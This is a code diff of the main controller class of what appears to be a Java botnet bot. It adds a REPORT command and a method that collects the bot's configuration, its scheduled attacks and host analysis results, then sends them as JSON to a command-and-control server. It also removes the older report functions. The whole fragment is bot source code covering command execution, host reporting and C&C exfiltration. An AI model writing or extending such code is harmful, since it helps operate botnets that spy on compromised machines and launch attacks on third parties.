@@ -136,8 +136,7 @@ public class CoreController {
             cmd = getNextCommand();
             executeCommand(cmd);
             if (cmd.getScope().isSendReportAfter()) {
-              Report analysis = makeReport();
-              sendReport(analysis);
+              report();
             }
           } catch (BotCommandParsingException exc) {
             LOGGER.warn("Cannot read command. {}", exc.getMessage());
@@ -145,8 +144,6 @@ public class CoreController {
             LOGGER.warn("Not valid command read. {}", exc.getMessage());
           } catch (BotExecutionException exc) {
             LOGGER.warn("Cannot execute command. {}", exc.getMessage());
-          } catch (BotAnalysisException exc) {
-            LOGGER.warn("Cannot analyze local host. {}", exc.getMessage());
           } finally {
             if (!cmd.getScope().equals(CommandScope.KILL) &&
                 !cmd.getScope().equals(CommandScope.RESTART)) {
@@ -195,7 +192,7 @@ public class CoreController {
   }
 
   /**
-   * Executes the state `INIT`.
+   * Executes the state {@code INIT}.
    * Initializes the bot, giving it an identity.
    * @throws  BotInitializationException when errors during initialization.
    */
@@ -211,7 +208,7 @@ public class CoreController {
   }
 
   /**
-   * Executes the state `JOIN`.
+   * Executes the state {@code JOIN}.
    * Establishes a connection with the controller and make the bot join the botnet.
    * @throws  BotInitializationException when errors during botnet joining.
    */
@@ -260,7 +257,7 @@ public class CoreController {
   }
 
   /**
-   * Executes a command in state {@code EXECUTION}.
+   * Executes a command both in state {@code EXECUTION} and {@code SLEEP}.
    * @param cmd the command to execute.
    * @throws BotMalformedCommandException when command parameters are malformed.
    * @throws BotExecutionException when command cannot be correctly executed.
@@ -316,6 +313,20 @@ public class CoreController {
         kill(killWait);
 
         break;
+
+      case REPORT:
+        if (!STATE.equals(BotState.EXECUTION)) {
+          throw new BotExecutionException("Cannot execute command, because [STATE] is not [EXECUTION]");
+        }
+        final Interval reportDelay = (Interval) cmd.getParams().get("delay");
+        if (reportDelay != null) {
+          delayCommand(reportDelay.getRandomDuration(), CommandScope.REPORT);
+        }
+
+        report();
+
+        break;
+
 
       case RESTART:
         final String resource = (String) cmd.getParams().get("resource");
@@ -436,6 +447,44 @@ public class CoreController {
     LOGGER.info("Bot shut down");
     changeState(BotState.DEAD);
     LOGGER.traceExit();
+  }
+
+  /**
+   * Executes command {@code REPORT}.
+   * @throws BotExecutionException when bot cannot send report to controllers.
+   */
+  private static void report() throws BotExecutionException {
+    LOGGER.trace("Producing report...");
+    Report report = new SimpleReport();
+    report.put("config", AppConfigurationService.getConfigurations());
+    try {
+      report.put("attacks", POOL.getScheduledAttacks());
+    } catch (SchedulerException exc) {
+      throw new BotExecutionException("Cannot retrieve scheduled attack. %s", exc.getMessage());
+    }
+    for (Analyzer analyzer : ANALYZERS) {
+      final String analyzerName = analyzer.getName();
+      try {
+        final Report analysisReport = analyzer.makeReport();
+        report.put(analyzerName, analysisReport);
+      } catch (BotAnalysisException exc) {
+        throw new BotExecutionException("Cannot produce report for analyzer %s", analyzerName);
+      }
+    }
+    LOGGER.trace("Report produced");
+    final String logResource = CONTROLLER.getLogResource();
+    LOGGER.info("Sending report to C&C at {}...", logResource);
+    final String json;
+    try {
+      json = report.toJson();
+      IOManager.writeResource(logResource, json);
+    } catch (JsonProcessingException exc) {
+      throw new BotExecutionException("Cannot serialize report. %s", exc.getMessage());
+    } catch (IOException exc) {
+      throw new BotExecutionException("Cannot communicate with C&C at %s", logResource);
+    }
+    LOGGER.info(AppLogMarkers.REPORT, "Report sent to CC at {}\n\t{}",
+        CONTROLLER.getLogResource(), json);
   }
 
   /**
@@ -589,49 +638,6 @@ public class CoreController {
     try {
       unit.sleep(amount);
     } catch (InterruptedException ignored) {}
-  }
-
-  /**
-   * Generates a local host analysis report.
-   * @return the local host analysis report.
-   * @throws BotAnalysisException when local host analysis cannot be correctly executed.
-   */
-  private static Report makeReport() throws BotAnalysisException {
-    LOGGER.trace("Producing host analysis report...");
-    Report report = new SimpleReport();
-    report.put("config", AppConfigurationService.getConfigurations());
-    try {
-      report.put("attacks", POOL.getScheduledAttacks());
-    } catch (SchedulerException exc) {
-      throw new BotAnalysisException("Cannot retrieve scheduled attack. %s", exc.getMessage());
-    }
-    for (Analyzer analyzer : ANALYZERS) {
-      final Report analysisReport = analyzer.makeReport();
-      report.put(analyzer.getName(), analysisReport);
-    }
-    LOGGER.trace("Final report produced");
-    return report;
-  }
-
-  /**
-   * Sends analysis reports to CONTROLLERS, as specified in {@link AppConfiguration}.
-   * @param report the report to send.
-   * @throws BotExecutionException when bot cannot send report to CONTROLLERS.
-   */
-  private static void sendReport(Report report) throws BotExecutionException {
-    final String logResource = CONTROLLER.getLogResource();
-    LOGGER.info("Sending analysis to C&C at {}...", logResource);
-    final String json;
-    try {
-      json = report.toJson();
-      IOManager.writeResource(logResource, json);
-    } catch (JsonProcessingException exc) {
-      throw new BotExecutionException("Cannot serialize report. %s", exc.getMessage());
-    } catch (IOException exc) {
-      throw new BotExecutionException("Cannot communicate with C&C at %s", logResource);
-    }
-    LOGGER.info(AppLogMarkers.REPORT, "Report sent to CC at {}\n\t{}",
-        CONTROLLER.getLogResource(), json);
   }
 
   /**
